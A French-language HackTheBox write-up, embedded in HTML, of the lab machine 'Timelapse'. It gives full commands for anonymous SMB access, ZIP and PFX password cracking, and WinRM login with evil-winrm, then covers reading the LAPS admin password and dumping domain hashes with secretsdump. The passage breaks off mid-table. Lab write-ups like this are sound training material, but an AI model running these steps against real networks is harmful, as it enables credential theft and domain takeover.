@@ -1,0 +1,2351 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Timelapse - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Windows, Easy, Active Directory">
+<meta name="description" content="📋 Résumé Exécutif Machine : Timelapse (10.10.11.152)
+OS : Windows Server 2019
+Domaine : timelapse.htb / DC01.timelapse.htb
+Difficulté : Easy
+Points Clés : SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse
+🔗 Chaîne d&rsquo;Attaque Complète SMB Anonymous Access ↓ [Partage &#34;Shares&#34;] winrm_backup.zip (password-protected) ↓ [zip2john &#43; john → supremelegacy] legacyy_dev_auth.pfx (encrypted) ↓ [pfx2john &#43; john → thuglegacy] Certificate SSL &#43; Private Key ↓ [WinRM Certificate Auth] legacyy (utilisateur domain) ↓ [PowerShell ConsoleHost_history.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/timelapse/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/timelapse/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Timelapse - HackTheBox Writeup" />
+<meta property="og:description" content="📋 Résumé Exécutif Machine : Timelapse (10.10.11.152)
+OS : Windows Server 2019
+Domaine : timelapse.htb / DC01.timelapse.htb
+Difficulté : Easy
+Points Clés : SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse
+🔗 Chaîne d&rsquo;Attaque Complète SMB Anonymous Access ↓ [Partage &#34;Shares&#34;] winrm_backup.zip (password-protected) ↓ [zip2john &#43; john → supremelegacy] legacyy_dev_auth.pfx (encrypted) ↓ [pfx2john &#43; john → thuglegacy] Certificate SSL &#43; Private Key ↓ [WinRM Certificate Auth] legacyy (utilisateur domain) ↓ [PowerShell ConsoleHost_history." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/timelapse/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Timelapse - HackTheBox Writeup"/>
+<meta name="twitter:description" content="📋 Résumé Exécutif Machine : Timelapse (10.10.11.152)
+OS : Windows Server 2019
+Domaine : timelapse.htb / DC01.timelapse.htb
+Difficulté : Easy
+Points Clés : SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse
+🔗 Chaîne d&rsquo;Attaque Complète SMB Anonymous Access ↓ [Partage &#34;Shares&#34;] winrm_backup.zip (password-protected) ↓ [zip2john &#43; john → supremelegacy] legacyy_dev_auth.pfx (encrypted) ↓ [pfx2john &#43; john → thuglegacy] Certificate SSL &#43; Private Key ↓ [WinRM Certificate Auth] legacyy (utilisateur domain) ↓ [PowerShell ConsoleHost_history."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Timelapse - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/timelapse/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Timelapse - HackTheBox Writeup",
+  "name": "Timelapse - HackTheBox Writeup",
+  "description": "📋 Résumé Exécutif Machine : Timelapse (10.10.11.152)\nOS : Windows Server 2019\nDomaine : timelapse.htb / DC01.timelapse.htb\nDifficulté : Easy\nPoints Clés : SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse\n🔗 Chaîne d\u0026rsquo;Attaque Complète SMB Anonymous Access ↓ [Partage \u0026#34;Shares\u0026#34;] winrm_backup.zip (password-protected) ↓ [zip2john + john → supremelegacy] legacyy_dev_auth.pfx (encrypted) ↓ [pfx2john + john → thuglegacy] Certificate SSL + Private Key ↓ [WinRM Certificate Auth] legacyy (utilisateur domain) ↓ [PowerShell ConsoleHost_history.",
+  "keywords": [
+    "HTB", "Windows", "Easy", "Active Directory"
+  ],
+  "articleBody": "📋 Résumé Exécutif Machine : Timelapse (10.10.11.152)\nOS : Windows Server 2019\nDomaine : timelapse.htb / DC01.timelapse.htb\nDifficulté : Easy\nPoints Clés : SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse\n🔗 Chaîne d’Attaque Complète SMB Anonymous Access ↓ [Partage \"Shares\"] winrm_backup.zip (password-protected) ↓ [zip2john + john → supremelegacy] legacyy_dev_auth.pfx (encrypted) ↓ [pfx2john + john → thuglegacy] Certificate SSL + Private Key ↓ [WinRM Certificate Auth] legacyy (utilisateur domain) ↓ [PowerShell ConsoleHost_history.txt] svc_deploy credentials (cleartext) ↓ [Membre de LAPS_Readers] LAPS Password Administrator ↓ [impacket-secretsdump] Hash NTLM de TRX ↓ [Pass-the-Hash] TRX → Root Flag 1️⃣ RECONNAISSANCE 🔍 Scan Nmap # Scan rapide des ports nmap -p- --min-rate 10000 10.10.11.152 # Scan détaillé nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV 10.10.11.152 -oN nmap.txt Résultats :\nPort Service Version Rôle 53 DNS Simple DNS Plus Résolution de noms 88 Kerberos Microsoft Windows Kerberos Authentification AD 135 MSRPC Microsoft Windows RPC Communication RPC 139 NetBIOS-SSN Microsoft Windows NetBIOS Partage fichiers (legacy) 389 LDAP Microsoft AD LDAP Annuaire Active Directory 445 SMB Microsoft-DS (Windows Server 2019) Partage fichiers moderne 464 kpasswd5 - Changement mot de passe Kerberos 593 HTTP-RPC Microsoft Windows RPC over HTTP RPC via HTTP 636 LDAPS - LDAP sécurisé (SSL/TLS) 3268 Global Catalog Microsoft AD LDAP Catalogue global AD 3269 GC-SSL - Catalogue global sécurisé 5986 WinRM-HTTPS Microsoft HTTPAPI 2.0 PowerShell Remoting (SSL) 9389 ADWS .NET Message Framing AD Web Services Identification :\nDomaine : timelapse.htb Hostname : DC01.timelapse.htb Rôle : Domain Controller Windows Server 2019 WinRM : Port 5986 (HTTPS uniquement, pas de port 5985) Certificat SSL : CN=DC01.timelapse.htb ⏰ Décalage Horaire : +59min 53s\n⚠️ Note Importante : Le décalage horaire peut causer des échecs d’authentification Kerberos (erreur KRB_AP_ERR_SKEW). Synchronisation recommandée :\nsudo ntpdate -s 10.10.11.152 📝 Configuration /etc/hosts echo \"10.10.11.152 dc01.timelapse.htb timelapse.htb\" | sudo tee -a /etc/hosts 2️⃣ ÉNUMÉRATION SMB 🎓 Qu’est-ce que SMB ? SMB (Server Message Block) est le protocole de partage de fichiers et imprimantes de Microsoft.\nVersions :\nSMBv1 : Obsolète, vulnérable (EternalBlue, etc.) SMBv2/3 : Moderne, chiffrement supporté Vecteurs d’attaque courants :\n✅ Accès anonyme (null session) ✅ Énumération des utilisateurs ✅ Partages mal sécurisés ✅ Fichiers sensibles accessibles 🔎 Énumération des Partages # Liste des partages avec accès anonyme smbclient -L //10.10.11.152 -N # Alternative avec netexec netexec smb 10.10.11.152 --shares -u '' -p '' Résultat :\nSharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk ⭐ Partage personnalisé ! SYSVOL Disk Logon server share Analyse :\nPartage Accès Anonyme Description ADMIN$ ❌ Partage administratif (C:\\Windows) C$ ❌ Racine du disque C:\\ IPC$ ✅ (lecture) Inter-Process Communication NETLOGON ❌ Scripts de connexion domaine Shares ✅ (lecture/écriture) Partage personnalisé suspect SYSVOL ❌ Stratégies de groupe (GPO) 📁 Exploration du Partage “Shares” smbclient //10.10.11.152/Shares -N Navigation :\nsmb: \\\u003e ls . D 0 Mon Oct 25 17:39:15 2021 .. D 0 Mon Oct 25 17:39:15 2021 Dev D 0 Mon Oct 25 21:40:06 2021 HelpDesk D 0 Mon Oct 25 17:48:42 2021 smb: \\\u003e cd Dev smb: \\Dev\\\u003e ls winrm_backup.zip A 2611 Mon Oct 25 17:46:42 2021 smb: \\Dev\\\u003e get winrm_backup.zip 💡 Découverte Critique : Fichier winrm_backup.zip dans le dossier Dev !\nIndices :\nNom du fichier → Backup WinRM (credentials/certificats probable) Dossier “Dev” → Environnement de développement (souvent moins sécurisé) Accès anonyme → Mauvaise configuration de sécurité 3️⃣ CRACKING - ZIP ET PFX 🔓 Étape 1 : Cracking du ZIP 🎯 Objectif : Le fichier ZIP est protégé par mot de passe.\nVérification :\nunzip winrm_backup.zip # Archive: winrm_backup.zip # [winrm_backup.zip] legacyy_dev_auth.pfx password: Conversion pour John :\nzip2john winrm_backup.zip \u003e zip.john Contenu du hash :\nwinrm_backup.zip/legacyy_dev_auth.pfx:$pkzip2$1*1*2*0*a33*9fb*... Cracking :\njohn zip.john --wordlist=/usr/share/wordlists/rockyou.txt Résultat (3 secondes) :\nUsing default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:03 DONE (2025-12-13 14:15) 0.2777g/s 9631Kp/s 9631Kc/s 9631KC/s 🔑 Mot de passe ZIP : supremelegacy\nExtraction :\nunzip winrm_backup.zip # Archive: winrm_backup.zip # [winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy # extracting: legacyy_dev_auth.pfx 📜 Étape 2 : Analyse du Fichier PFX 🎓 Qu’est-ce qu’un fichier PFX/P12 ?\nPFX (Personal Information Exchange) = PKCS#12 est un format de conteneur cryptographique qui stocke :\nCertificat X.509 (partie publique)\nIdentifie le propriétaire Contient la clé publique Signé par une CA (Certificate Authority) Clé privée RSA/ECC (partie privée)\nPermet le déchiffrement Permet la signature numérique DOIT rester secrète ! Chaîne de certificats (optionnel)\nCertificats intermédiaires Certificat racine (Root CA) Usages courants :\nContexte Usage WinRM/PowerShell Authentification par certificat IIS/Web Servers Certificats SSL/TLS (HTTPS) VPN Authentification client Code Signing Signature d’applications S/MIME Chiffrement d’emails Inspection du PFX :\n# Lister le contenu sans extraire openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -info # Enter Import Password: [demande le mot de passe] ❌ Problème : Le PFX lui-même est protégé par un mot de passe !\n🔓 Étape 3 : Cracking du PFX Conversion pour John :\npython3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx \u003e pfx.john ⚠️ Erreur Potentielle :\nTraceback (most recent call last): File \"/usr/share/john/pfx2john.py\", line 5, in \u003cmodule\u003e from asn1crypto import cms ModuleNotFoundError: No module named 'asn1crypto' Solution :\n# Installation du package système sudo apt install python3-asn1crypto -y # Vérification python3 -c \"import asn1crypto; print('OK')\" # OK # Réessayer python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx \u003e pfx.john Cracking :\njohn pfx.john --wordlist=/usr/share/wordlists/rockyou.txt Résultat (5 secondes) :\nUsing default input encoding: UTF-8 Loaded 1 password hash (pfx [PKCS12 PBE SHA1/SHA2 AES/3DES 256/256 AVX2 8x]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:05 DONE (2025-12-13 14:18) 0.1960g/s 632889p/s 632889c/s 632889C/s 🔑 Mot de passe PFX : thuglegacy\n🔐 Étape 4 : Extraction Certificat et Clé Privée Extraction de la clé privée :\nopenssl pkcs12 \\ -in legacyy_dev_auth.pfx \\ -nocerts \\ -out key.pem \\ -nodes # Enter Import Password: thuglegacy Flags expliqués :\nFlag Signification -in Fichier PFX source -nocerts Exporter uniquement la clé privée (pas les certificats) -out Fichier de sortie -nodes No DES - Ne pas chiffrer la clé exportée (stockage en clair) ⚠️ Sécurité : Le flag -nodes produit une clé privée non chiffrée. En production, utiliser -des3 ou -aes256 pour chiffrer la clé exportée.\nExtraction du certificat :\nopenssl pkcs12 \\ -in legacyy_dev_auth.pfx \\ -nokeys \\ -out cert.pem # Enter Import Password: thuglegacy Flags expliqués :\nFlag Signification -nokeys Exporter uniquement le certificat (pas la clé privée) Vérification des fichiers générés :\nls -lh *.pem # -rw------- 1 kali kali 1.9K Dec 13 14:20 cert.pem # -rw------- 1 kali kali 1.7K Dec 13 14:19 key.pem # Inspecter le certificat openssl x509 -in cert.pem -text -noout Informations du certificat :\nSubject: CN=Legacyy Issuer: CN=timelapse-DC01-CA Validity: Not Before: Oct 25 14:05:37 2021 GMT Not After : Oct 25 14:25:37 2031 GMT ⬅️ Valide 10 ans ! Subject Alternative Name: othername: UPN::legacyy@timelapse.htb ⬅️ Username AD ! 💡 Découvertes Importantes :\nNom d’utilisateur : legacyy@timelapse.htb CA : timelapse-DC01-CA (CA interne du domaine) UPN (User Principal Name) : legacyy@timelapse.htb Usage : Client Authentication (EKU 1.3.6.1.5.5.7.3.2) 4️⃣ ACCÈS INITIAL - WINRM CERTIFICATE AUTH 🎓 Qu’est-ce que WinRM ? Windows Remote Management (WinRM) est l’implémentation Microsoft du protocole WS-Management (Web Services for Management).\nFonctionnalités :\nExécution de commandes PowerShell à distance Administration de serveurs Windows sans RDP Automatisation de tâches (scripts, déploiements) Collecte d’informations système Ports par défaut :\nPort Protocole Chiffrement 5985 HTTP ❌ Clair (non recommandé en production) 5986 HTTPS ✅ TLS/SSL Prérequis d’accès :\nMembre du groupe Remote Management Users OU administrateur local/domaine Pare-feu autorisant le port 5985/5986 🔐 Méthodes d’Authentification WinRM Méthode Description Sécurité Basic Username + Password (Base64) ⚠️ Faible (clear text) Kerberos Ticket-based (AD) ✅ Fort Negotiate Kerberos si disponible, sinon NTLM ✅ Bon CredSSP Delegation de credentials ⚠️ Risque de vol Certificate Certificat X.509 + Clé privée ✅ Très fort Notre cas : Authentification par certificat client (Client Certificate Authentication)\n🚪 Connexion WinRM avec Evil-WinRM Evil-WinRM est un outil offensif pour exploitation WinRM :\nSupport certificats Upload/Download de fichiers Load de modules PowerShell Bypass AMSI/AppLocker Menu interactif Installation :\n# Via gem (Ruby) sudo gem install evil-winrm # Vérification evil-winrm --version # Evil-WinRM shell v3.5 Commande de connexion :\nevil-winrm \\ -i 10.10.11.152 \\ -c cert.pem \\ -k key.pem \\ -S Flags expliqués :\nFlag Signification -i IP/hostname cible -c Certificat (public key) -k Clé privée (private key) -S SSL activé (port 5986 au lieu de 5985) ✅ Connexion Réussie !\nEvil-WinRM shell v3.5 Warning: Remote path completions is disabled Data: For more information, check Evil-WinRM GitHub Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u003e whoami timelapse\\legacyy *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u003e hostname DC01 🏁 User Flag *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u003e cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop\u003e dir Directory: C:\\Users\\legacyy\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 12/13/2025 6:57 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop\u003e type user.txt 3a84f0e5************************ ⭐ USER FLAG 5️⃣ ÉLÉVATION - SVC_DEPLOY 🔍 Énumération Post-Exploitation Informations utilisateur :\n*Evil-WinRM* PS\u003e whoami /all USER INFORMATION ---------------- User Name SID ================= ============================================= timelapse\\legacyy S-1-5-21-671920749-559770252-3318990721-1603 GROUP INFORMATION ----------------- Group Name Type SID =========================================== ================ ============= Everyone Well-known group S-1-1-0 BUILTIN\\Remote Management Users Alias S-1-5-32-580 ⬅️ WinRM access BUILTIN\\Users Alias S-1-5-32-545 NT AUTHORITY\\NETWORK Well-known group S-1-5-2 NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 ... *Evil-WinRM* PS\u003e net user legacyy /domain The request will be processed at a domain controller for domain timelapse.htb. User name legacyy Full Name Legacyy Comment User's comment Country/region code 000 (System Default) Account active Yes ... Local Group Memberships *Remote Management Use Global Group memberships *Domain Users *Development 💡 Découvertes :\nMembre de Remote Management Users (accès WinRM confirmé) Membre du groupe Development (permissions potentiellement élevées) Compte utilisateur standard (pas admin) 🎯 PowerShell History - Goldmine de Credentials 🎓 Concept Important :\nPowerShell stocke un historique des commandes dans un fichier texte via le module PSReadLine. Ce fichier contient TOUT ce qui a été tapé, y compris :\n✅ Mots de passe en clair ✅ Credentials dans des scripts ✅ Commandes administratives sensibles ✅ Tokens/API keys ✅ Chemins réseau Chemin du fichier :\n$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Équivalent :\nC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Lecture de l’historique :\n*Evil-WinRM* PS\u003e type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit 🔑 JACKPOT ! Credentials Trouvés :\nUsername: svc_deploy Password: E3R$Q62^12p7PLlC%KWaxuaV 🎓 Analyse Technique du Script PowerShell Ligne par ligne :\n# 1. Créer des options de session (ignorer validation SSL) $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck # Flags expliqués : # -SkipCACheck : Ne pas vérifier si le certificat est signé par une CA de confiance # -SkipCNCheck : Ne pas vérifier si le CN du certificat correspond au hostname # -SkipRevocationCheck : Ne pas vérifier si le certificat est révoqué (CRL) # 2. Convertir le mot de passe en SecureString $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force # -AsPlainText : Le mot de passe est fourni en clair (pas chiffré) # -Force : Ignorer l'avertissement de sécurité # 3. Créer un objet PSCredential $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) # PSCredential = Username + SecureString password (format requis par PowerShell) # 4. Exécuter une commande à distance via WinRM invoke-command \\ -computername localhost \\ # Cible : machine locale (DC01) -credential $c \\ # Utiliser les credentials de svc_deploy -port 5986 \\ # WinRM HTTPS -usessl \\ # Forcer SSL/TLS -SessionOption $so \\ # Options créées à l'étape 1 -scriptblock {whoami} # Commande à exécuter : whoami 💡 Pourquoi ce script existe ?\nScénario probable :\nAdministrateur a besoin de tester WinRM avec svc_deploy Certificat SSL auto-signé → nécessite de skip les vérifications Met le mot de passe en clair dans le script (mauvaise pratique !) Oublie de nettoyer l’historique PowerShell 🔄 Connexion en tant que svc_deploy Déconnexion :\n*Evil-WinRM* PS\u003e exit Nouvelle connexion :\nevil-winrm \\ -i 10.10.11.152 \\ -u svc_deploy \\ -p 'E3R$Q62^12p7PLlC%KWaxuaV' \\ -S ✅ Connexion Réussie !\n*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u003e whoami timelapse\\svc_deploy *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u003e whoami /groups GROUP INFORMATION ----------------- Group Name Type SID =========================================== ================ ============= ... BUILTIN\\Remote Management Users Alias S-1-5-32-580 TIMELAPSE\\LAPS_Readers Group S-1-5-21-...-2103 ⭐ ... 🎉 Découverte Majeure : svc_deploy est membre du groupe LAPS_Readers !\n6️⃣ EXPLOITATION LAPS 🎓 Qu’est-ce que LAPS ? LAPS (Local Administrator Password Solution) est une solution Microsoft gratuite qui :\nProblème résolu :\nÉvite l’utilisation du même mot de passe pour le compte Administrateur local sur toutes les machines Empêche les attaques Pass-the-Hash latérales Fonctionnement :\nExtension du schéma AD :\nAjoute 2 attributs aux objets Computer : ms-Mcs-AdmPwd : Mot de passe en clair (!) ms-Mcs-AdmPwdExpirationTime : Date d’expiration Agent LAPS sur chaque machine :\nGénère un mot de passe aléatoire (12-14 caractères par défaut) Applique le mot de passe au compte Administrateur local Écrit le mot de passe dans AD (attribut ms-Mcs-AdmPwd) Rotation automatique (ex: tous les 30 jours) ACLs sur l’attribut AD :\nSeuls les membres de LAPS_Readers (ou équivalent) peuvent lire ms-Mcs-AdmPwd Les ordinateurs peuvent écrire leur propre mot de passe (SELF) Architecture :\n┌──────────────┐ │ Computer │ │ DC01 │───┐ │ │ │ Write password │ LAPS Agent │ │ (every 30 days) └──────────────┘ │ ▼ ┌─────────────────────────────┐ │ Active Directory │ │ ┌───────────────────────┐ │ │ │ Computer Object: DC01 │ │ │ │ │ │ │ │ ms-Mcs-AdmPwd: │ │ │ │ \"P@ssw0rd123!xyz\" │◄─┼─── Read by │ │ │ │ LAPS_Readers │ │ ms-Mcs-AdmPwdExp: │ │ │ │ 2025-01-15 │ │ │ └───────────────────────┘ │ └─────────────────────────────┘ Avantages Sécurité :\n✅ Mots de passe uniques par machine ✅ Rotation automatique ✅ Audit centralisé (qui lit les mots de passe) ✅ Pas de stockage local du mot de passe Vulnérabilité :\n❌ Mot de passe stocké en clair dans AD (pas de hash !) ❌ Si compromission d’un compte LAPS_Readers → accès admin local sur toutes les machines 🔍 Énumération LAPS Vérification des groupes de svc_deploy :\n*Evil-WinRM* PS\u003e net user svc_deploy /domain User name svc_deploy Full Name svc_deploy Comment ... Local Group Memberships *Remote Management Use Global Group memberships *LAPS_Readers *Domain Users ⭐ Énumération des ordinateurs du domaine :\n*Evil-WinRM* PS\u003e Get-ADComputer -Filter * | Select-Object Name Name ---- DC01 ⬅️ Le contrôleur de domaine Alternative :\n*Evil-WinRM* PS\u003e $env:LOGONSERVER \\\\DC01 *Evil-WinRM* PS\u003e $env:USERDNSDOMAIN timelapse.htb 🔑 Récupération du LAPS Password Commande PowerShell :\n*Evil-WinRM* PS\u003e Get-ADComputer -Identity \"DC01\" -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd name ms-Mcs-AdmPwd ---- ------------- DC01 I)}73pmp{9+;E2/kWv0LZ7Tt ⭐ Alternative (méthode LDAP directe) :\n*Evil-WinRM* PS\u003e Get-ADObject -Filter {objectClass -eq \"computer\"} -Properties ms-Mcs-AdmPwd DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb ms-Mcs-AdmPwd : I)}73pmp{9+;E2/kWv0LZ7Tt Name : DC01 ObjectClass : computer 🎉 Credentials Administrator Local Obtenus :\nUsername: Administrator Password: I)}73pmp{9+;E2/kWv0LZ7Tt 💡 Note : Ce mot de passe est pour le compte Administrateur LOCAL de DC01, pas nécessairement le compte Domain Admin.\n7️⃣ ACCÈS ROOT 🚪 Connexion en tant qu’Administrator evil-winrm \\ -i 10.10.11.152 \\ -u Administrator \\ -p 'I)}73pmp{9+;E2/kWv0LZ7Tt' \\ -S ✅ Connexion Réussie !\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e whoami timelapse\\administrator *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e whoami /groups | Select-String \"Admin\" BUILTIN\\Administrators Alias S-1-5-32-544 ⬅️ Admin local ... 🔍 Recherche du Root Flag Tentative 1 : Dossier classique\n*Evil-WinRM* PS\u003e cd C:\\Users\\Administrator\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e dir # Vide ! Tentative 2 : Recherche globale\n*Evil-WinRM* PS\u003e Get-ChildItem -Path C:\\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Where-Object {$_.Name -eq \"root.txt\"} Directory: C:\\Users\\TRX\\Desktop ⬅️ Utilisateur TRX ! Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 12/13/2025 6:57 PM 34 root.txt 🤔 Découverte Surprenante : Le root flag est dans le profil de TRX, pas d’Administrator !\n❌ Problème d’Accès Tentative de lecture directe :\n*Evil-WinRM* PS\u003e type C:\\Users\\TRX\\Desktop\\root.txt type : Access to the path 'C:\\Users\\TRX\\Desktop' is denied. At line:1 char:1 + type C:\\Users\\TRX\\Desktop\\root.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\Users\\TRX\\Desktop:String) + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand Analyse des ACLs :\n*Evil-WinRM* PS\u003e Get-Acl C:\\Users\\TRX\\Desktop | Format-List Path : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\TRX\\Desktop Owner : TIMELAPSE\\TRX ⬅️ Propriétaire : TRX Access : TIMELAPSE\\TRX Allow FullControl ⬅️ Seul TRX a accès ! NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow ReadAndExecute, Synchronize ⬅️ Admins en lecture seulement ! 🎓 Explication :\nMême en tant qu’Administrator du domaine, les ACLs NTFS (permissions fichiers) peuvent restreindre l’accès.\nOptions :\n✅ Modifier les ACLs (mais risque de détection) ✅ Se connecter en tant que TRX (Pass-the-Hash) ❌ Forcer l’accès (peut corrompre le système) Décision : Utiliser secretsdump pour obtenir le hash de TRX, puis Pass-the-Hash.\n8️⃣ POST-EXPLOITATION - SECRETSDUMP 🎓 Qu’est-ce que secretsdump ? impacket-secretsdump est un outil Python qui extrait les secrets d’un système Windows :\nSecrets extraits :\nType Description Usage Offensif SAM Hashes locaux (users locaux) Pass-the-Hash local LSA Secrets Credentials stockés (services, tâches planifiées) Mouvement latéral NTDS.dit Base de données AD (tous les users du domaine) Pass-the-Hash, Golden Ticket Cached Credentials Hashes domain users (offline logon) Cracking offline DPAPI MasterKeys Clés de déchiffrement DPAPI Déchiffrer credentials stockés Méthodes d’extraction :\nVia réseau (RPC/SMB) ← Méthode utilisée ici\nNécessite credentials admin Pas besoin d’exécution de code Local (fichiers SYSTEM/SAM/NTDS.dit)\nNécessite accès aux fichiers système Volume Shadow Copy souvent utilisé 💾 Dump des Secrets Commande :\nimpacket-secretsdump \\ Administrator:'I)}73pmp{9+;E2/kWv0LZ7Tt'@10.10.11.152 Résultat (extrait) :\nImpacket v0.11.0 - Copyright 2023 Fortra [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x0c0e91e0c81bad9d5dac0c4cc5c5b4a3 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping Domain Credentials (NTDS.dit) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37::: timelapse.htb\\legacyy:1603:aad3b435b51404eeaad3b435b51404ee:93da975bcea111839cc584f2f528d63e::: timelapse.htb\\payl0ad:2601:aad3b435b51404eeaad3b435b51404ee:51bcc0dd5ad8d7d06e6e1438e99a83f8::: timelapse.htb\\svc_deploy:3103:aad3b435b51404eeaad3b435b51404ee:c912f3533b7114980dd7b6094be1a9d8::: timelapse.htb\\TRX:5101:aad3b435b51404eeaad3b435b51404ee:4c7121d35cd421cbbd3e44ce83bc923e::: ⭐ ... [*] Kerberos keys grabbed timelapse.htb\\Administrator:aes256-cts-hmac-sha1-96:184a90b3... timelapse.htb\\Administrator:aes128-cts-hmac-sha1-96:7b984a6... timelapse.htb\\Administrator:des-cbc-md5:6e035f9... ... [*] Cleaning up... [*] Stopping service RemoteRegistry 📊 Tableau Récapitulatif des Hashes Utilisateur RID Hash LM Hash NTLM Rôle Administrator 500 aad3b435b51404eeaad3b435b51404ee 22d04d77cc32a59f9fe6701aa9ffafb0 Domain Admin Guest 501 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0 Compte désactivé krbtgt 502 aad3b435b51404eeaad3b435b51404ee 2960d580f05cd511b3da3d3663f3cb37 Service account Kerberos legacyy 1603 aad3b435b51404eeaad3b435b51404ee 